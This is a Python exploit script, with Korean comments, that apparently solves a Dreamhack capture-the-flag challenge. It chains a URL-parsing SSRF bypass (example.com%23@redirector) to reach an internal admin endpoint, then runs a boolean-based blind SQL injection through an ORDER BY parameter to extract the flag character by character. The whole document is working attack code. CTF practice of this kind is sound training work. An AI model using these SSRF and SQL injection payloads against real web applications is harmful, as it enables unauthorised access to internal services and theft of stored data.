import requests
import time

# 타겟 서버 주소
TARGET = "http://host3.dreamhack.games:9211"

print("="*50)
print("[*] Internal Secret CTF Exploit 시작")
print("="*50)

# 1. SSRF 페이로드: urlparse와 requests의 파싱 차이(Differential Parsing)를 이용
# unquote() 후에는 http://example.com#@redirector... 가 되어 호스트 검증(example.com) 통과
# requests.get()은 %23을 username으로 인식하여 redirector:8081로 요청
ssrf_url = "http://example.com%23@redirector:8081/redir?to=http://internalapi:8081/admin/flag"

print(f"\n[DEBUG] 1단계: SSRF 작업 큐에 등록 시도")
print(f"[DEBUG] Target URL: {TARGET}/fetch")
print(f"[DEBUG] Payload URL: {ssrf_url}")

try:
    res = requests.post(f"{TARGET}/fetch", data={"url": ssrf_url}, timeout=10)
    print(f"[DEBUG] Fetch 응답 코드: {res.status_code}")
    print(f"[DEBUG] Fetch 응답 내용: {res.text}")

    if not res.ok or not res.json().get("ok"):
        print("[-] 작업 큐 등록 실패. 서버 상태나 URL을 확인해주세요.")
        exit(1)

    job_id = res.json()["job_id"]
    print(f"[+] 성공적으로 큐에 등록되었습니다! Job ID: {job_id}")

except requests.RequestException as e:
    print(f"[-] HTTP 요청 중 에러 발생: {e}")
    exit(1)

print("\n[DEBUG] 백그라운드 워커가 작업을 처리하여 플래그를 DB에 저장할 때까지 3초 대기합니다...")
time.sleep(3)

print("\n[DEBUG] 2단계: Boolean-based Blind SQL Injection으로 플래그 추출 시작")
flag = "DH{"
offset = 3 # 'DH{' 이후의 문자부터 추출 시작 (SQLite instr 함수는 1-based index를 사용, +3부터 탐색)
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_?@#-}"

print(f"[DEBUG] 초기 설정된 Flag 값: {flag}")
print(f"[DEBUG] 사용할 Charset: {charset}")
print("-" * 50)

while True:
    found_char = False
    for char in charset:
        hex_val = char.encode().hex().upper()

        # SQLi 페이로드 작성
        # 조건이 참이면 id*1 (최신순), 거짓이면 id*-1 (과거순) 정렬을 유도
        sql_condition = f"hex(substr((SELECT result FROM jobs WHERE id='{job_id}'), instr((SELECT result FROM jobs WHERE id='{job_id}'), 'DH{{') + {offset}, 1)) = '{hex_val}'"
        order_payload = f"id*(CASE WHEN {sql_condition} THEN 1 ELSE -1 END)"

        # 현재 진행 상황을 덮어쓰기로 출력
        print(f"[DEBUG] 시도 중인 문자: '{char}' (Hex: {hex_val}, Offset: {offset}) | 페이로드 전송 중...", end="\r")

        try:
            audit_res = requests.get(f"{TARGET}/audit", params={"order": order_payload}, timeout=10)

            if not audit_res.ok:
                print(f"\n[-] /audit 요청 실패 (상태 코드: {audit_res.status_code})")
                continue

            events = audit_res.json()
            if len(events) < 2:
                print("\n[-] 데이터베이스에 이벤트가 충분하지 않습니다 (최소 2개 이벤트 필요).")
                exit(1)

            # 반환된 이벤트 배열의 양끝단 timestamp(t) 값을 비교하여 정렬 순서 파악
            t_first = events[0]['t']
            t_last = events[-1]['t']

            # t_first < t_last 이면 역순(최신순) 정렬된 것이므로 조건이 참(True)임을 의미
            if t_first < t_last:
                flag += char
                print(f"\n[+] 일치하는 문자 발견! -> '{char}' | 현재까지 추출된 플래그: {flag}")
                print(f"[DEBUG] 참(True) 조건 확인: 첫 이벤트 t({t_first}) < 마지막 이벤트 t({t_last})")
                offset += 1
                found_char = True
                break

        except requests.RequestException as e:
            print(f"\n[-] SQLi 요청 중 에러 발생: {e}")
            exit(1)

    if not found_char:
        print("\n\n[-] 더 이상 일치하는 문자를 찾을 수 없습니다. 루프를 종료합니다.")
        print(f"[DEBUG] 플래그에 Charset에 포함되지 않은 특수문자가 있거나 서버 통신이 끊겼을 수 있습니다.")
        break

    if flag.endswith("}"):
        print(f"\n\n[🎉] 플래그 추출 완료: {flag}")
        break